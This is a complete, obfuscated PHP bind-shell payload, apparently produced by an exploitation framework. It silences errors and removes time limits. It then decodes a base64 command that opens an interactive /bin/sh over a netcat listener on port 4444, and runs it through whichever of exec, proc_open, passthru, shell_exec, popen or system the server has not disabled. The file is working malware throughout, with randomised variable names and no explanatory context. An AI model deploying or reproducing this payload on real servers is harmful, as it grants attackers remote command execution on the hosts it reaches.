/*<?php /**/
@error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
$QreztFAPWf9=@ini_get('disable_functions');
if(!empty($QreztFAPWf9)){
  $QreztFAPWf9=preg_replace('/[, ]+/',',',$QreztFAPWf9);
  $QreztFAPWf9=explode(',',$QreztFAPWf9);
  $QreztFAPWf9=array_map('trim',$QreztFAPWf9);
}else{
  $QreztFAPWf9=array();
}

$XM5f=base64_decode('bWtmaWZvIC90bXAvZGFtZjsgL2Jpbi9zaCAtaSA8L3RtcC9kYW1mIDI+JjEgfCAobmMgLWxwIDQ0NDQgfHwgbmMgLWwgNDQ0NCk+L3RtcC9kYW1mOyBybSAvdG1wL2RhbWY=');
if (FALSE!==stristr(PHP_OS,'win')){
  $XM5f=$XM5f." 2>&1\n";
}
$R2pZGdgCYje='is_callable';
$kihjc='in_array';
if($R2pZGdgCYje('exec')&&!$kihjc('exec',$QreztFAPWf9)){
  $RpamN=array();
  exec($XM5f,$RpamN);
  $RpamN=join(chr(10),$RpamN).chr(10);
}else
if($R2pZGdgCYje('proc_open')&&!$kihjc('proc_open',$QreztFAPWf9)){
  $handle=proc_open($XM5f,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
  $RpamN=NULL;
  while(!feof($pipes[1])){
    $RpamN.=fread($pipes[1],1024);
  }
  @proc_close($handle);
}else
if($R2pZGdgCYje('passthru')&&!$kihjc('passthru',$QreztFAPWf9)){
  ob_start();
  passthru($XM5f);
  $RpamN=ob_get_contents();
  ob_end_clean();
}else
if($R2pZGdgCYje('shell_exec')&&!$kihjc('shell_exec',$QreztFAPWf9)){
  $RpamN=`$XM5f`;
}else
if($R2pZGdgCYje('popen')&&!$kihjc('popen',$QreztFAPWf9)){
  $fp=popen($XM5f,'r');
  $RpamN=NULL;
  if(is_resource($fp)){
    while(!feof($fp)){
      $RpamN.=fread($fp,1024);
    }
  }
  @pclose($fp);
}else
if($R2pZGdgCYje('system')&&!$kihjc('system',$QreztFAPWf9)){
  ob_start();
  system($XM5f);
  $RpamN=ob_get_contents();
  ob_end_clean();
}else
{
  $RpamN=0;
}

?>
